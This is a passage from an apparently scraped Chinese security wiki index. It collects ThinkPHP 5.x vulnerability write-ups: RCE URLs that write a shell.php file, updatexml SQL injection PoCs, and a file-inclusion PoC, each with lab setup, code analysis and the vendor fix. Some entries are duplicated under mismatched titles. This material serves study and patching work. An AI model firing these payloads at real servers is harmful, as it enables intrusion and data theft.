http://www.0-sec.org/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E http://www.0-sec.org/?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20phpinfo();?%3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:20 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.x 命令执行漏洞说明/Thinkphp 5.x 命令执行漏洞说明.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.x 命令执行漏洞说明/Thinkphp 5.x 命令执行漏洞说明.html","title":"Thinkphp 5.x 命令执行漏洞说明","keywords":"","body":"Thinkphp 5.x 命令执行漏洞说明 先简单说明一下吧，5.x我们这里罗列了目前碰到的全部tp系列的对应版本漏洞，我在这里简要说明一下，不看别后悔 tp框架系列中，5.0.x 跟 5.1.x 中，各个系列里的poc是几乎为通用的 比如 5.0.1中某个poc在5.0.3中也是可以用的，也就是说当我们碰到5.0.8的时候，可以尝试用5.0.1 或 5.0.5等 5.0.x 系列的poc去尝试使用， 5.1.x 系列同理 执行流程： 首先发起请求->开始路由检测->获取pathinfo信息->路由匹配->开始路由解析->获得模块、控制器、操作方法调度信息->开始路由调度->解析模块和类名->组建命名空间>查找并加载类->实例化控制器并调用操作方法->构建响应对象->响应输出->日志保存->程序运行结束 漏洞原因： 路由控制不严谨，默认不开启强制路由，从而可以任意调用Thinkphp的类库 主要有俩种方法，1.Request中的变量覆盖导致RCE 2.路由控制不严谨导致的RCE Request中的变量覆盖导致RCE 版本名 是否可被攻击 攻击条件5.0.0 否 无5.0.1 否 无5.0.2 否 无5.0.3 否 无5.0.4 否 无5.0.5 否 无5.0.6 否 无5.0.7 否 无5.0.8 是 无需开启debug5.0.9 是 无需开启debug5.0.10 是 无需开启debug5.0.11 是 无需开启debug5.0.12 是 无需开启debug5.0.13 是 需开启debug5.0.14 是 需开启debug5.0.15 是 需开启debug5.0.16 是 需开启debug5.0.17 是 需开启debug5.0.18 是 需开启debug5.0.19 是 需开启debug5.0.20 否 无5.0.21 是 需开启debug5.0.22 是 需开启debug5.0.23 是 需开启debug 路由控制不严谨导致的RCE 5.0.23--5.1.31版本 补充 由于受windows系统的影响，会导致部分payload在windows主机无法使用 并且由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类。 5.1是下面这些： think\\Loader Composer\\Autoload\\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561 think\\Error think\\Container think\\App think\\Env think\\Config think\\Hook think\\Facade think\\facade\\Env env think\\Db think\\Lang think\\Request think\\Log think\\log\\driver\\File think\\facade\\Route route think\\Route think\\route\\Rule think\\route\\RuleGroup think\\route\\Domain think\\route\\RuleItem think\\route\\RuleName think\\route\\Dispatch think\\route\\dispatch\\Url think\\route\\dispatch\\Module think\\Middleware think\\Cookie think\\View think\\view\\driver\\Think think\\Template think\\template\\driver\\File think\\Session think\\Debug think\\Cache think\\cache\\Driver think\\cache\\driver\\File 5.0 的有： think\\Route think\\Config think\\Error think\\App think\\Request think\\Hook think\\Env think\\Lang think\\Log think\\Loader 两个版本公有的是： think\\Route think\\Loader think\\Error think\\App think\\Env think\\Config think\\Hook think\\Lang think\\Request think\\Log 本想找出两个版本共有的利用类和方法，但由于类文件大多被重写了，所以没耐住性子一一去找（菜） 所以，payload为上述类的利用方法，是可以兼容windows和linux多个平台的，兼容多个平台有什么用呢？插件批量可以减少误判等，一条payload通用，一把梭多好。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:21 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/（CVE-2018-16385）Thinkphp  5.1.23 sql注入漏洞/（CVE-2018-16385）Thinkphp  5.1.23 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/（CVE-2018-16385）Thinkphp  5.1.23 sql注入漏洞/（CVE-2018-16385）Thinkphp  5.1.23 sql注入漏洞.html","title":"（CVE-2018-16385）Thinkphp  5.1.23 sql注入漏洞","keywords":"","body":"（CVE-2018-16385）Thinkphp 5.1.x SQL注入 一、漏洞简介 在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。 二、漏洞影响 ThinkPHP \\ 三、复现过程 环境搭建 1.下载安装thinkphp5.1.x 对于thinkphp5.1.x完整版，目前官方没有直接下载的链接。Github上只是放出核心版。该版本需要以Composer或Git方式进行安装。 这里以Composer安装方式说明。 在 Linux 和 Mac OS X 中可以运行如下命令： curl -sS https://getcomposer.org/installer | php mv composer.phar/usr/local/bin/composer 在 Windows 中，你需要下载并运行 Composer-Setup.exe 。 安装好之后，切换路径到WEB目录下运行： composercreate-project topthink/think=5.1.1 tp5.1 --prefer-dist 然后会生成一个名为tp5.1的文件夹。到此think5.1.1下载成功。 2.然后在浏览器中访问 Thinkphp image.png如果出现该页面，则证明安装成功。 3.Demo示例 Thinkphp 编写Demo文件，并将文件命名为Test.php，然后放在/tp5.1/application/index/controller/目录下。 4.数据库 与Demo文件匹配，需要创建一个user表，然后设一个字段(id)。 Thinkphp Payload构造 根据以上分析，构造payload需要满足以下条件： 1.传入的$order需要是一个数组。 2.$val 必须也是数组。 3.至少知道数据库表中的一个字段名称，并且传入两个参数。 4.闭合 ` 。 最终Payload构造如下： http://0-sec.org/tp5.1/public/index/test/index?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23][]=1 或 http://0-sec.org/tp5.1/public/index/test/index?order[id`,'aaa')| updatexml(1,concat(0x3a,user()),1)%23][]= Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:57 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.0 = Thinkphp = 5.0.21 sql注入漏洞/5.0.0 = Thinkphp = 5.0.21 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.0 = Thinkphp = 5.0.21 sql注入漏洞/5.0.0 = Thinkphp = 5.0.21 sql注入漏洞.html","title":"5.0.0 = Thinkphp = 5.0.21 sql注入漏洞","keywords":"","body":"5.0.0 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（所有 Mysql 聚合函数相关方法均存在注入）。本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。 漏洞概要 二、漏洞影响 5.0.0\\ 5.1.3\\ 三、复现过程 不同版本 payload 需稍作调整： 5.0.0~5.0.21 、 5.1.3～5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 5.1.11～5.1.25 ： id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.1.25 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.25\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('options'); $result = db('users')->max($options); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'Mochazz'); insert into users(id,username) values(2,'Jerry'); insert into users(id,username) values(3,'Kitty'); poc http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.26 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了数据库驱动，代码中多了检测特殊字符的片段。接下来我们直接来分析代码。 首先，用户可控数据未经过滤，传入 Query 类的 max 方法进行聚合查询语句构造，接着调用本类的 aggregate 方法。本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 SQL注入 问题。我们看到 aggregate 方法又调用了 Mysql 类的 aggregate 方法，在该方法中，我们可以明显看到程序将用户可控变量 $field ，经过 parseKey 方法处理后，与 SQL 语句进行了拼接。下面我们就来具体看看 parseKey 方法。 parseKey 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 parseKey 方法处理后，程序又回到了上图的 $this->value() 方法中，该方法会调用 Builder 类的 select 方法来构造 SQL 语句。这个方法应该说是在分析 ThinkPHP 漏洞时，非常常见的了。其无非就是使用 str_replace 方法，将变量替换到 SQL 语句模板中。这里，我们重点关注 parseField 方法，因为用户可控数据存储在 $options[\\'field\\'] 变量中并被传入该方法。 进入 parseField 方法，我们发现用户可控数据只是经过 parseKey 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 SQL 语句模板里，导致 SQL注入漏洞 的发生 漏洞修复 官方的修复方法是：当匹配到除了 字母、点号、星号 以外的字符时，就抛出异常。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:25 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.0 = Thinkphp =5.0.18 文件包含漏洞/5.0.0 = Thinkphp =5.0.18 文件包含漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.0 = Thinkphp =5.0.18 文件包含漏洞/5.0.0 = Thinkphp =5.0.18 文件包含漏洞.html","title":"5.0.0 = Thinkphp =5.0.18 文件包含漏洞","keywords":"","body":"5.0.0 \\ 一、漏洞简介 本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致 文件包含漏洞 的产生。 二、漏洞影响 5.0.0 \\ 5.1.0 \\ 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.18 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.0.18\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： assign(request()->get()); return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html } } 创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。 poc http://0-sec.org:8000/index/index/index?cacheFile=demo.php 接着访问链接，即可触发 文件包含漏洞 。 漏洞分析 首先在官方发布的 5.0.19 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了模板引擎，其中存在危险函数 extract ，有可能引发变量覆盖漏洞。接下来，我们直接跟进代码一探究竟。 首先，用户可控数据未经过滤，直接通过 Controller 类的 assign 方法进行模板变量赋值，并将可控数据存在 think\\View 类的 data 属性中。 接着，程序开始调用 fetch 方法加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html ，如果默认路径模板不存在，程序就会报错。 我们跟进到 Template 类的 fetch 方法，可以发现可控变量 $vars 赋值给 $this->data 并最终传入 File 类的 read 方法。而 read 方法中在使用了 extract 函数后，直接包含了 $cacheFile 变量。这里就是漏洞发生的关键原因（可以通过 extract 函数，直接覆盖 $cacheFile 变量，因为 extract 函数中的参数 $vars 可以由用户控制）。 漏洞修复 官方的修复方法是：先将 $cacheFile 变量存储在 $this->cacheFile 中，在使用 extract 函数后，最终 include 的变量是 $this->cacheFile ，这样也就避免了 include 被覆盖后的变量值。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:22 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.13 = Thinkphp = 5.0.15 sql注入漏洞/5.0.13 = Thinkphp = 5.0.15 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.13 = Thinkphp = 5.0.15 sql注入漏洞/5.0.13 = Thinkphp = 5.0.15 sql注入漏洞.html","title":"5.0.13 = Thinkphp = 5.0.15 sql注入漏洞","keywords":"","body":"5.0.13 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ insert 方法注入）。本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。 二、漏洞影响 5.0.13\\ 、 5.1.0\\ 。 三、复现过程 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.15 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.15\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); db('users')->insert(['username' => $username]); return 'Update success'; } } 在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); poc http://0-sec.org/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.0.16 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其修改的 Builder.php 文件代码比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先， payload 数据经过 ThinkPHP 内置方法的过滤后（不影响我们的 payload ），直接进入了 $this->builder 的 insert 方法，这里的 $this->builder 为 \\think\\db\\builder\\Mysql 类，代码如下： 而 Mysql 类继承于 Builder 类，即上面的 $this->builder->insert() 最终调用的是 Builder 类的 insert 方法。在 insert 方法中，我们看到其调用 parseData 方法来分析并处理数据，而 parseData 方法直接将来自用户的数据 $val 进行了拼接返回。我们的恶意数据存储在 $val[1] 中，虽经过了 parseKey 方法处理，当丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据。 上面，我们看到直接将用户数据进行拼接。然后再回到 Builder 类的 insert 方法，直接通过替换字符串的方式，将 $data 填充到 SQL 语句中，进而执行，造成 SQL注入漏洞 。 至此，我们已将整个漏洞分析完了。实际上，上面的 switch 结构中，3种情况返回的数据都有可能造成 SQL 注入漏洞，但是在观察 ThinkPHP 官方的修复代码中，发现其只对 inc 和 dec 进行了修复，而对于 exp 的情况并未处理，这是为什么呢？ 实际上， exp 的情况早在传入 insert 方法前就被 ThinkPHP 内置过滤方法给处理了，如果数据中存在 exp ，则会被替换成 exp空格 ，这也是为什么 ThinkPHP 官方没有对 exp 的情况进行处理的原因了。具体内置过滤方法的代码如下： 漏洞修复 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:28 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.0 = ThinkPHP = 5.1.10 文件包含漏洞/5.1.0 = ThinkPHP = 5.1.10 文件包含漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.0 = ThinkPHP = 5.1.10 文件包含漏洞/5.1.0 = ThinkPHP = 5.1.10 文件包含漏洞.html","title":"5.1.0 = ThinkPHP = 5.1.10 文件包含漏洞","keywords":"","body":"5.0.0 \\ 一、漏洞简介 本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致 文件包含漏洞 的产生。 二、漏洞影响 5.0.0 \\ 5.1.0 \\ 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.18 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.0.18\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： assign(request()->get()); return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html } } 创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。 poc http://0-sec.org:8000/index/index/index?cacheFile=demo.php 接着访问链接，即可触发 文件包含漏洞 。 漏洞分析 首先在官方发布的 5.0.19 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了模板引擎，其中存在危险函数 extract ，有可能引发变量覆盖漏洞。接下来，我们直接跟进代码一探究竟。 首先，用户可控数据未经过滤，直接通过 Controller 类的 assign 方法进行模板变量赋值，并将可控数据存在 think\\View 类的 data 属性中。 接着，程序开始调用 fetch 方法加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html ，如果默认路径模板不存在，程序就会报错。 我们跟进到 Template 类的 fetch 方法，可以发现可控变量 $vars 赋值给 $this->data 并最终传入 File 类的 read 方法。而 read 方法中在使用了 extract 函数后，直接包含了 $cacheFile 变量。这里就是漏洞发生的关键原因（可以通过 extract 函数，直接覆盖 $cacheFile 变量，因为 extract 函数中的参数 $vars 可以由用户控制）。 漏洞修复 官方的修复方法是：先将 $cacheFile 变量存储在 $this->cacheFile 中，在使用 extract 函数后，最终 include 的变量是 $this->cacheFile ，这样也就避免了 include 被覆盖后的变量值。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:34 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.0 = Thinkphp = 5.1.5 sql注入漏洞/5.1.0 = Thinkphp = 5.1.5 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.0 = Thinkphp = 5.1.5 sql注入漏洞/5.1.0 = Thinkphp = 5.1.5 sql注入漏洞.html","title":"5.1.0 = Thinkphp = 5.1.5 sql注入漏洞","keywords":"","body":"5.0.13 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ insert 方法注入）。本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。 二、漏洞影响 5.0.13\\ 、 5.1.0\\ 。 三、复现过程 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.15 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.15\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); db('users')->insert(['username' => $username]); return 'Update success'; } } 在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); poc http://0-sec.org/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.0.16 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其修改的 Builder.php 文件代码比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先， payload 数据经过 ThinkPHP 内置方法的过滤后（不影响我们的 payload ），直接进入了 $this->builder 的 insert 方法，这里的 $this->builder 为 \\think\\db\\builder\\Mysql 类，代码如下： 而 Mysql 类继承于 Builder 类，即上面的 $this->builder->insert() 最终调用的是 Builder 类的 insert 方法。在 insert 方法中，我们看到其调用 parseData 方法来分析并处理数据，而 parseData 方法直接将来自用户的数据 $val 进行了拼接返回。我们的恶意数据存储在 $val[1] 中，虽经过了 parseKey 方法处理，当丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据。 上面，我们看到直接将用户数据进行拼接。然后再回到 Builder 类的 insert 方法，直接通过替换字符串的方式，将 $data 填充到 SQL 语句中，进而执行，造成 SQL注入漏洞 。 至此，我们已将整个漏洞分析完了。实际上，上面的 switch 结构中，3种情况返回的数据都有可能造成 SQL 注入漏洞，但是在观察 ThinkPHP 官方的修复代码中，发现其只对 inc 和 dec 进行了修复，而对于 exp 的情况并未处理，这是为什么呢？ 实际上， exp 的情况早在传入 insert 方法前就被 ThinkPHP 内置过滤方法给处理了，如果数据中存在 exp ，则会被替换成 exp空格 ，这也是为什么 ThinkPHP 官方没有对 exp 的情况进行处理的原因了。具体内置过滤方法的代码如下： 漏洞修复 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:31 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.16 = Thinkphp = 5.1.22 sql注入漏洞/5.1.16 = Thinkphp = 5.1.22 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.16 = Thinkphp = 5.1.22 sql注入漏洞/5.1.16 = Thinkphp = 5.1.22 sql注入漏洞.html","title":"5.1.16 = Thinkphp = 5.1.22 sql注入漏洞","keywords":"","body":"5.1.16 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ orderby 方法注入）。本次漏洞存在于 Builder 类的 parseOrder 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。 二、漏洞影响 5.1.16 \\ 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.1.22 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.22\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('orderby'); $result = db('users')->where(['username' => 'mochazz'])->order($orderby)->find(); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); 访问 http://localhost:8000/index/index/index?orderby\\[id\\`\\|updatexml(1,concat(0x7,user(),0x7e),1)%23\\]=1 链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.23 版本更新说明中，发现其中提到该版本增强了 order 方法的安全性。 通过查阅其 commit 记录，发现其修改了 Builder.php 文件中的 parseOrder 方法。其添加了一个 if 语句判断，来过滤 )、# 两个符号。 接下来，我们直接跟着上面的攻击 payload 来看看漏洞原理。首先程序通过 input 方法获取数据，并通过 filterCalue 方法进行简单过滤，但是根本没有对数组的键进行过滤处理。 接着数据就原样被传入数据库操作相关方法中。在 Query 类的 order 方法中，我们可以看到数据没有任何过滤，直接存储在 $this->options[\\'order\\'] 中。（下图 第19行 ） 接着来到 find 方法，在 Connection 类的 find 方法中调用 Builder 类的 select 方法来生成 SQL 语句。相信大家对 Builder 类的 select 方法应该不会陌生吧，因为前几篇分析文章中都有提及这个方法。这个方法通过 str_replace 函数将数据填充到 SQL 模板语句中。这次我们要关注的是 parseOrder 方法，这个方法在新版的 ThinkPHP 中做了代码调整，我们跟进。 在 parseOrder 方法中，我们看到程序通过 parseKey 方法给变量两端都加上了反引号（下图 第26行 ），然后直接拼接字符串返回（下图 第17行 ），没有进行任何过滤、检测，这也是导致本次 SQL注入漏洞 的原因。 漏洞修复 官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 )、# 两个符号。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:43 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.3=ThinkPHP5=5.1.25 sql注入漏洞/5.1.3=ThinkPHP5=5.1.25 sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.3=ThinkPHP5=5.1.25 sql注入漏洞/5.1.3=ThinkPHP5=5.1.25 sql注入漏洞.html","title":"5.1.3=ThinkPHP5=5.1.25 sql注入漏洞","keywords":"","body":"5.0.0 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（所有 Mysql 聚合函数相关方法均存在注入）。本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。 漏洞概要 二、漏洞影响 5.0.0\\ 5.1.3\\ 三、复现过程 不同版本 payload 需稍作调整： 5.0.0~5.0.21 、 5.1.3～5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 5.1.11～5.1.25 ： id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.1.25 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.25\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('options'); $result = db('users')->max($options); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'Mochazz'); insert into users(id,username) values(2,'Jerry'); insert into users(id,username) values(3,'Kitty'); poc http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.26 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了数据库驱动，代码中多了检测特殊字符的片段。接下来我们直接来分析代码。 首先，用户可控数据未经过滤，传入 Query 类的 max 方法进行聚合查询语句构造，接着调用本类的 aggregate 方法。本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 SQL注入 问题。我们看到 aggregate 方法又调用了 Mysql 类的 aggregate 方法，在该方法中，我们可以明显看到程序将用户可控变量 $field ，经过 parseKey 方法处理后，与 SQL 语句进行了拼接。下面我们就来具体看看 parseKey 方法。 parseKey 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 parseKey 方法处理后，程序又回到了上图的 $this->value() 方法中，该方法会调用 Builder 类的 select 方法来构造 SQL 语句。这个方法应该说是在分析 ThinkPHP 漏洞时，非常常见的了。其无非就是使用 str_replace 方法，将变量替换到 SQL 语句模板中。这里，我们重点关注 parseField 方法，因为用户可控数据存储在 $options[\\'field\\'] 变量中并被传入该方法。 进入 parseField 方法，我们发现用户可控数据只是经过 parseKey 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 SQL 语句模板里，导致 SQL注入漏洞 的发生 漏洞修复 官方的修复方法是：当匹配到除了 字母、点号、星号 以外的字符时，就抛出异常。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:37 "},"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.6 = Thinkphp = 5.1.7（非最新的 5.1.8 版本也可利用）sql注入漏洞/5.1.6 = Thinkphp = 5.1.7（非最新的 5.1.8 版本也可利用）sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.1.6 = Thinkphp = 5.1.7（非最新的 5.1.8 版本也可利用）sql注入漏洞/5.1.6 = Thinkphp = 5.1.7（非最新的 5.1.8 版本也可利用）sql注入漏洞.html","title":"5.1.6 = Thinkphp = 5.1.7（非最新的 5.1.8 版本也可利用）sql注入漏洞","keywords":"","body":"5.1.6 \\ 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ update 方法注入）。本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生 二、漏洞影响 5.1.6\\5.1.8 版本也可利用)。 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.7\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); db('users')->where(['id' => 1])->update(['username' => $username]); return 'Update success'; } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); poc http://0-sec.org:8000/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 